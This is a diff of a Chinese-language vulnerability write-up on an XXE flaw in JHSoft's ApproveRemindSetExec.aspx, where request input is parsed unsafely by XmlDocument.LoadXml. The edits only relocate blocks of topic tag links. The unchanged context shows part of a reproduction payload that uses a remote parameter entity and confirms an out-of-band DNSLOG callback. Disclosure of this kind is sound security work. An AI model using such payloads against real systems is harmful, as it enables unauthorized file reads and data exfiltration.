@@ -20,14 +20,6 @@ asset_dir: embedded-base64
 
 # 漏洞分析
 
-深入探索
-
-软件
-
-客户关系管理
-
-网络安全
-
 直接根据 `ApproveRemindSetExec.aspx` 在 bin 目录下查找 `JHSoft.Web.AddMenu.dll` 将其进行反编译后找到 `ApproveRemindSetExec` 的处理逻辑
 
 ```
@@ -44,6 +36,14 @@ public class ApproveRemindSetExec : JHSoft.Base.Page
     xmlDocument.LoadXml(xml);
 ```
 
+深入探索
+
+编程
+
+计算机服务器
+
+网络安全
+
 请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。
 
 # 漏洞复现
@@ -59,14 +59,6 @@ Content-Type: application/x-www-form-urlencoded
 %remote;]>
 <root/>
 ```
-
-深入探索
-
-编程
-
-计算机服务器
-
-计算机安全
 
 在DNSLOG平台成功收到请求
 
